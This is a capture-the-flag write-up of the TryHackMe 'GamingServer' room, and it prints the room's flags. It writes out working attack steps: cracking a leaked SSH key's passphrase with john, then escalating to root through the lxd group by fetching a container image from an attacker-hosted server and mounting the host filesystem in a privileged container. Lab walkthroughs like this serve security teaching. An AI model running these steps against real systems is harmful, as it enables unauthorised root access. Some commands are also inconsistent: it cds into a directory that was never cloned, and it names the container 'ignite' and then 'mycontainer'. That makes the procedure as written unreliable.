---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - brute-force
  - lxd
---

# GamingServer
![GamingServer logo](logos/gamingserver_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [GamingServer](https://tryhackme.com/room/gamingserver)  

## Description
"An Easy Boot2Root box for beginners
Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system."

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* No `sitemap` file  
* Comment in source code: "john, please add some actual content to the site! lorem ipsum is horrible to look at."  
*"john" - possible username?*  
* Web page has links to `about.html` and `myths.html`: nothing interesting in source code for either  
* `robots.txt` has an entry for `/uploads`  
* `ffuf` scan reveals a `/secret` directory: hosts an RSA private key  
* `/uploads` directory contains dictionary file, a copy of the Hacker Manifesto, and a .jpg file

**Action(s)**  
:white_check_mark: Save contents of key found on `/secret` endpoint  
*Saved as `id_rsa`*  
:white_check_mark: Download dictionary list from `/uploads` directory with `curl`  
*Saved as `dict.lst`*  
:white_check_mark: Download .jpg file with `curl`  
*Saved as `meme.jpg`*  

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.6p1	# Only result: username enumeration
searchsploit httpd 2.4.29	# Only result: DoS
```

## Foothold
```
ssh2john id_rsa > key.hash
john key.hash --wordlist=dict.lst		# Password cracked as "letmein"
chmod 600 id_rsa
ssh john@TARGET_IP_ADDRESS -i id_rsa	# Login successful
john@exploitable:~$ ls -al
total 60
drwxr-xr-x 8 john john  4096 Jul 27  2020 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo
john@exploitable:~$ cat user.txt
```
??? success "What is the user flag?"
	a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

## Privilege Escalation
```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

[lxd/lxc Group - Privilege escalation](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html)

```
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
cd lxd-alpine-builder
sudo python3 -m http.server

john@exploitable:~$ wget http://ATTACKER_IP_ADDRESS:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
john@exploitable:~$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
john@exploitable:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
john@exploitable:~$ lxc start mycontainer
john@exploitable:~$ lxc exec mycontainer /bin/sh

~ # ls -al /mnt/root
total 2091108
drwxr-xr-x   24 root     root          4096 Feb  5  2020 .
drwxr-xr-x    1 root     root             8 Apr 25 20:58 ..
drwxr-xr-x    2 root     root          4096 Feb  5  2020 bin
drwxr-xr-x    3 root     root          4096 Feb  5  2020 boot
drwxr-xr-x    2 root     root          4096 Feb  5  2020 cdrom
drwxr-xr-x   15 root     root          3720 Apr 25 19:25 dev
drwxr-xr-x   93 root     root          4096 Jul 27  2020 etc
drwxr-xr-x    3 root     root          4096 Feb  5  2020 home
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x   22 root     root          4096 Feb  5  2020 lib
drwxr-xr-x    2 root     root          4096 Aug  5  2019 lib64
drwx------    2 root     root         16384 Feb  5  2020 lost+found
drwxr-xr-x    2 root     root          4096 Aug  5  2019 media
drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
drwxr-xr-x    2 root     root          4096 Aug  5  2019 opt
dr-xr-xr-x  162 root     root             0 Apr 25 19:25 proc
drwx------    3 root     root          4096 Feb  5  2020 root
drwxr-xr-x   27 root     root           920 Apr 25 20:56 run
drwxr-xr-x    2 root     root         12288 Feb  5  2020 sbin
drwxr-xr-x    4 root     root          4096 Feb  5  2020 snap
drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
-rw-------    1 root     root     2141192192 Feb  5  2020 swap.img
dr-xr-xr-x   13 root     root             0 Apr 25 20:02 sys
drwxrwxrwt   11 root     root          4096 Apr 25 20:39 tmp
drwxr-xr-x   10 root     root          4096 Aug  5  2019 usr
drwxr-xr-x   14 root     root          4096 Feb  5  2020 var
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
~ # ls -al /mnt/root/root
total 32
drwx------    3 root     root          4096 Feb  5  2020 .
drwxr-xr-x   24 root     root          4096 Feb  5  2020 ..
-rw-------    1 root     root            42 Feb  5  2020 .bash_history
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Feb  5  2020 .ssh
-rw-------    1 root     root          1090 Feb  5  2020 .viminfo
-rw-r--r--    1 root     root            33 Feb  5  2020 root.txt
~ # cat /mnt/root/root/root.txt
```
??? success "What is the root flag?"
	2e337b8c9f3aff0c2b3e8d4e6a7c88fc

**Tools Used**  
`john` `lxc`

**Date completed:** 25/04/26  
**Date published:** 25/04/26